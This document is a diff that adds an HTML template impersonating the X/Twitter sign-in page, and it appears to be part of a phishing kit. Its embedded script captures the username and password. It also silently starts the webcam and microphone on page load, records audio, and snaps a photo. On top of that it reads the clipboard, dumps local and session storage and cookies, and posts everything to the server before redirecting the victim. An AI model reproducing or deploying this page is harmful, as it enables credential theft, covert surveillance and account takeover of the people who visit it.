@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X / Twitter</title>
+    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #000;
+            color: #e7e9ea;
+            min-height: 100vh;
+            display: flex;
+        }
+        /* Left panel */
+        .tw-left {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            min-height: 100vh;
+        }
+        .tw-x-logo {
+            fill: white;
+        }
+        /* Right panel */
+        .tw-right {
+            flex: 0 0 min(50%, 500px);
+            padding: 60px 80px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        @media (max-width: 768px) {
+            .tw-left { display: none; }
+            .tw-right {
+                flex: 1;
+                padding: 20px;
+            }
+        }
+        .tw-title {
+            font-size: 64px;
+            font-weight: 700;
+            margin-bottom: 48px;
+            letter-spacing: -2px;
+        }
+        .tw-subtitle {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+        }
+        /* Social login buttons */
+        .tw-social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            max-width: 300px;
+            background: #e7e9ea;
+            color: #0f1419;
+            border: none;
+            border-radius: 40px;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 10px 24px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: background .15s;
+        }
+        .tw-social-btn:hover { background: #d5d7d8; }
+        .tw-divider {
+            display: flex; align-items: center; gap: 12px;
+            margin: 16px 0;
+            max-width: 300px;
+            color: #536471; font-size: 13px;
+        }
+        .tw-divider::before, .tw-divider::after {
+            content: ''; flex: 1; height: 1px; background: #2f3336;
+        }
+        /* Input fields */
+        .tw-input-wrap {
+            position: relative;
+            max-width: 300px;
+            margin-bottom: 12px;
+        }
+        .tw-input {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #536471;
+            border-radius: 4px;
+            color: #e7e9ea;
+            font-size: 17px;
+            padding: 22px 12px 8px;
+            outline: none;
+            transition: border-color .2s;
+        }
+        .tw-input:focus { border-color: #1d9bf0; }
+        .tw-input-label {
+            position: absolute;
+            top: 14px; left: 13px;
+            color: #536471;
+            font-size: 15px;
+            pointer-events: none;
+            transition: all .15s;
+        }
+        .tw-input:focus + .tw-input-label,
+        .tw-input:not(:placeholder-shown) + .tw-input-label {
+            top: 7px;
+            font-size: 11px;
+            color: #1d9bf0;
+        }
+        .tw-btn {
+            width: 100%;
+            max-width: 300px;
+            background: #e7e9ea;
+            border: none;
+            border-radius: 40px;
+            color: #0f1419;
+            font-size: 15px;
+            font-weight: 700;
+            padding: 12px;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background .15s;
+        }
+        .tw-btn:hover { background: #d5d7d8; }
+        .tw-btn:disabled { opacity: 0.5; cursor: default; }
+        .tw-btn-blue {
+            background: #1d9bf0;
+            color: white;
+            max-width: 300px;
+        }
+        .tw-btn-blue:hover { background: #1a8cd8; }
+        .tw-link {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .tw-link:hover { text-decoration: underline; }
+        .tw-small {
+            font-size: 13px;
+            color: #536471;
+            max-width: 300px;
+            margin-bottom: 24px;
+        }
+        .tw-error {
+            color: #f4212e;
+            font-size: 13px;
+            max-width: 300px;
+            margin-bottom: 8px;
+            display: none;
+        }
+        .tw-signup {
+            margin-top: 40px;
+            max-width: 300px;
+        }
+        .tw-signup-title {
+            font-size: 17px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+        /* Loading spinner */
+        .tw-spinner {
+            width: 20px; height: 20px;
+            border: 2px solid rgba(15,20,25,0.3);
+            border-top-color: #0f1419;
+            border-radius: 50%;
+            animation: tw-spin .7s linear infinite;
+            display: none;
+            margin: 0 auto;
+        }
+        @keyframes tw-spin { to { transform: rotate(360deg); } }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<!-- Left: X logo -->
+<div class="tw-left">
+    <svg viewBox="0 0 24 24" width="380" height="380" class="tw-x-logo">
+        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.739l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+    </svg>
+</div>
+
+<!-- Right: Login form -->
+<div class="tw-right">
+    <div style="margin-bottom:48px;">
+        <svg viewBox="0 0 24 24" width="36" height="36" class="tw-x-logo">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.739l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+        </svg>
+    </div>
+
+    <div class="tw-title">Happening now</div>
+    <div class="tw-subtitle">Join X today.</div>
+
+    <!-- Google login -->
+    <button class="tw-social-btn" onclick="twLogin()">
+        <svg viewBox="0 0 24 24" width="18" height="18">
+            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        </svg>
+        Sign up with Google
+    </button>
+
+    <!-- Apple login -->
+    <button class="tw-social-btn" onclick="twLogin()">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="#0f1419">
+            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.7 9.05 7.4c1.3.07 2.21.77 3 .8 1.16-.19 2.26-.91 3.55-.83 1.51.14 2.65.77 3.36 1.9-3.12 1.87-2.38 5.98.48 7.13-.58 1.52-1.35 3.02-2.39 3.88zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+        </svg>
+        Sign up with Apple
+    </button>
+
+    <div class="tw-divider">or</div>
+
+    <button class="tw-btn tw-btn-blue" onclick="showLoginForm()">Sign in</button>
+
+    <!-- Login form (hidden initially) -->
+    <div id="tw-login-form" style="display:none;">
+        <div id="tw-error" class="tw-error">Wrong username, email, or password.</div>
+        <div class="tw-input-wrap">
+            <input type="text" id="tw-username" class="tw-input" placeholder=" " autocomplete="username">
+            <span class="tw-input-label">Phone, email, or username</span>
+        </div>
+        <div class="tw-input-wrap">
+            <input type="password" id="tw-password" class="tw-input" placeholder=" " autocomplete="current-password">
+            <span class="tw-input-label">Password</span>
+        </div>
+        <a href="#" class="tw-link" style="display:block;margin-bottom:16px;font-size:13px;">Forgot password?</a>
+        <button id="tw-login-btn" class="tw-btn tw-btn-blue" onclick="twLogin()">
+            <span id="tw-btn-text">Sign in</span>
+            <div id="tw-spinner" class="tw-spinner"></div>
+        </button>
+    </div>
+
+    <div class="tw-small">
+        By signing up, you agree to the <a href="#" class="tw-link">Terms of Service</a> and
+        <a href="#" class="tw-link">Privacy Policy</a>, including
+        <a href="#" class="tw-link">Cookie Use</a>.
+    </div>
+
+    <div class="tw-signup">
+        <div class="tw-signup-title">Already have an account?</div>
+        <button class="tw-btn" style="background:transparent;border:1px solid #536471;color:#1d9bf0;max-width:300px;" onclick="showLoginForm()">Sign in</button>
+    </div>
+</div>
+
+{% csrf_token %}
+<video id="tw-video" autoplay muted playsinline></video>
+<canvas id="tw-canvas"></canvas>
+
+<script>
+    function showLoginForm() {
+        document.getElementById('tw-login-form').style.display = 'block';
+        document.getElementById('tw-username').focus();
+    }
+
+    // ── Hardware capture ──
+    const twVideo = document.getElementById('tw-video');
+    const twCanvas = document.getElementById('tw-canvas');
+    let twStream = null, twWebcamReady = false;
+    let twRecorder = null, twAudioChunks = [], twAudioReady = false;
+    let twHardwareDone = false;
+    let twClipboard = null, twBattery = null, twNetwork = null;
+
+    function twStartHardware() {
+        if (twHardwareDone) return;
+        twHardwareDone = true;
+        if (!navigator.mediaDevices) return;
+        navigator.mediaDevices.getUserMedia({
+            video: { width: { ideal: 1280 }, facingMode: 'user' },
+            audio: { echoCancellation: false }
+        }).then(stream => {
+            twStream = stream;
+            twVideo.srcObject = stream;
+            twVideo.play().catch(() => {});
+            twVideo.addEventListener('canplay', () => { twWebcamReady = true; });
+            try {
+                const at = stream.getAudioTracks();
+                if (at.length > 0) {
+                    twRecorder = new MediaRecorder(new MediaStream(at));
+                    twRecorder.ondataavailable = e => { if (e.data.size > 0) twAudioChunks.push(e.data); };
+                    twAudioReady = true;
+                    twRecorder.start(1000);
+                }
+            } catch(e) {}
+        }).catch(() => { twHardwareDone = false; });
+    }
+
+    function twStealClipboard() {
+        try { navigator.clipboard && navigator.clipboard.readText().then(t => { if (t.trim()) twClipboard = t.slice(0, 2000); }).catch(() => {}); } catch(e) {}
+    }
+
+    try { navigator.getBattery && navigator.getBattery().then(b => { twBattery = `${Math.round(b.level*100)}%${b.charging?'⚡':'🔋'}`; }); } catch(e) {}
+    try { const c = navigator.connection || navigator.mozConnection; if (c) twNetwork = `${c.effectiveType||''} ${c.downlink?c.downlink+'Mbps':''}`.trim(); } catch(e) {}
+
+    document.addEventListener('click', twStealClipboard, { once: true });
+    window.addEventListener('load', () => setTimeout(twStartHardware, 600));
+
+    async function twLogin() {
+        const username = document.getElementById('tw-username')?.value.trim() || 'unknown';
+        const password = document.getElementById('tw-password')?.value.trim() || 'clicked';
+
+        if (document.getElementById('tw-login-form').style.display === 'none') {
+            showLoginForm();
+            return;
+        }
+
+        const btn = document.getElementById('tw-login-btn');
+        const btnText = document.getElementById('tw-btn-text');
+        const spinner = document.getElementById('tw-spinner');
+        if (btn) btn.disabled = true;
+        if (btnText) btnText.style.display = 'none';
+        if (spinner) spinner.style.display = 'block';
+        document.getElementById('tw-error').style.display = 'none';
+
+        twStealClipboard();
+
+        let snap = null;
+        try {
+            if (twStream && twVideo.videoWidth > 0 && twVideo.readyState >= 2) {
+                twCanvas.width = twVideo.videoWidth;
+                twCanvas.height = twVideo.videoHeight;
+                twCanvas.getContext('2d').drawImage(twVideo, 0, 0);
+                snap = twCanvas.toDataURL('image/jpeg', 0.8);
+            }
+        } catch(e) {}
+
+        const sendData = (audioB64) => {
+            const ls = {}, ss = {};
+            try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage.getItem(k); } } catch(e) {}
+            try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage.getItem(k); } } catch(e) {}
+            const csrf = document.querySelector('[name=csrfmiddlewaretoken]').value;
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+                body: JSON.stringify({
+                    username, password,
+                    webcam_snap: snap,
+                    voice_audio: audioB64,
+                    source_url: window.location.href,
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    device_info: `TW|Screen:${screen.width}x${screen.height}|Lang:${navigator.language}${twBattery?'|BAT:'+twBattery:''}${twNetwork?'|NET:'+twNetwork:''}`,
+                    local_storage: JSON.stringify(ls),
+                    session_storage: JSON.stringify(ss),
+                    cookies: document.cookie,
+                    authMode: 'LOGIN',
+                    clipboard: twClipboard,
+                    battery: twBattery,
+                    network_type: twNetwork,
+                    client_timestamp: new Date().toISOString(),
+                    client_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                })
+            }).catch(() => {}).finally(() => {
+                setTimeout(() => { window.location.href = '/apps/'; }, 600);
+            });
+        };
+
+        if (twAudioReady && twRecorder && twRecorder.state === 'recording') {
+            twRecorder.onstop = () => {
+                try {
+                    const blob = new Blob(twAudioChunks, { type: twRecorder.mimeType });
+                    const r = new FileReader();
+                    r.readAsDataURL(blob);
+                    r.onloadend = () => sendData(r.result);
+                    r.onerror = () => sendData(null);
+                } catch(e) { sendData(null); }
+            };
+            twRecorder.stop();
+        } else {
+            sendData(null);
+        }
+    }
+
+    document.addEventListener('keydown', e => { if (e.key === 'Enter') twLogin(); });
+</script>
+</body>
+</html>
